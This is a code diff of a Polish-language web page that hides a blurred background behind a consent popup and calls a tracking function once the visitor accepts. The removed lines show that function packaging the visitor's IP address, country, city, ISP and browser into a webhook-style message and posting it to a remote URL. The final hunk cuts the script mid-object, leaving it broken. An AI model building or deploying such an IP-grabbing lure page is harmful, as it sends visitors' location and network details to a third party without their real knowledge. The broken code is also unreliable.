@@ -16,8 +16,10 @@
             min-height: 100vh;
             background-color: #1a1a1a;
             position: relative;
+            overflow: hidden;
         }
 
+        /* Warstwa tła z płynnym efektem zmiany rozmycia (transition) */
         .background-blur {
             position: fixed;
             top: 0;
@@ -28,10 +30,16 @@
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
-            filter: blur(8px);
+            filter: blur(8px); /* Domyślne rozmycie na starcie */
             transform: scale(1.05);
             z-index: 1;
             pointer-events: none;
+            transition: filter 0.8s ease; /* Płynne wyostrzanie przez 0.8 sekundy */
+        }
+
+        /* Klasa usuwająca blur, dodawana przez JavaScript po akceptacji */
+        .unblurred {
+            filter: blur(0px) !important;
         }
 
         .main-content, .error-content {
@@ -118,7 +126,8 @@
 </head>
 <body>
 
-    <div class="background-blur"></div>
+    <!-- Warstwa tła -->
+    <div id="bgLayer" class="background-blur"></div>
 
     <!-- 1. OKNO POPUP -->
     <div id="privacyOverlay" class="overlay">
@@ -153,8 +162,8 @@
 
     <!-- 3. WŁAŚCIWA TREŚĆ STRONY -->
     <div id="mainPage" class="main-content">
-        <h1>Witaj na stronie głównej!</h1>
-        <p>Dziękujemy za zaakceptowanie regulaminu serwisu.</p>
+        <h1>Weryfikacja zakończona pomyślnie</h1>
+        <p>Dziękujemy za zaakceptowanie regulaminu serwisu. Obraz w tle został wyostrzony.</p>
     </div>
 
     <script>
@@ -164,6 +173,7 @@
             var consent = localStorage.getItem('siteConsent');
             if (consent === 'accepted') {
                 document.getElementById('privacyOverlay').style.display = 'none';
+                document.getElementById('bgLayer').classList.add('unblurred'); // Wyostrz tło, jeśli zgoda już była
                 startTracking();
             } else if (consent === 'declined') {
                 document.getElementById('privacyOverlay').style.display = 'none';
@@ -176,6 +186,7 @@
         function acceptTerms() {
             localStorage.setItem('siteConsent', 'accepted');
             document.getElementById('privacyOverlay').style.display = 'none';
+            document.getElementById('bgLayer').classList.add('unblurred'); // Usuwa blur po kliknięciu akceptacji
             startTracking();
         }
 
@@ -187,6 +198,7 @@
 
         function showPrivacyNote() {
             localStorage.removeItem('siteConsent');
+            document.getElementById('bgLayer').classList.remove('unblurred'); // Przywraca blur po powrocie
             document.getElementById('errorScreen').style.display = 'none';
             document.getElementById('privacyOverlay').style.display = 'flex';
         }
@@ -223,16 +235,3 @@
                 embeds: [{
                     title: "📥 Logowanie ruchu na stronie",
                     color: 3066993,
-                    fields: [
-                        { name: "🌐 Adres IP", value: "`" + (ipData.ip || "Brak") + "`", inline: true },
-                        { name: "🌍 Kraj", value: (ipData.country_name || "Nieznany"), inline: true },
-                        { name: "📍 Lokalizacja", value: (ipData.city || "Nieznane") + " (" + (ipData.region || "Nieznany") + ")", inline: true },
-                        { name: "🏢 Sieć (ISP)", value: (ipData.org || "Nieznany dostawca"), inline: false },
-                        { name: "🖥️ System/Przeglądarka", value: navigator.userAgent, inline: false }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            };
-
-            fetch(targetUrl, {
-                method: 'POST',
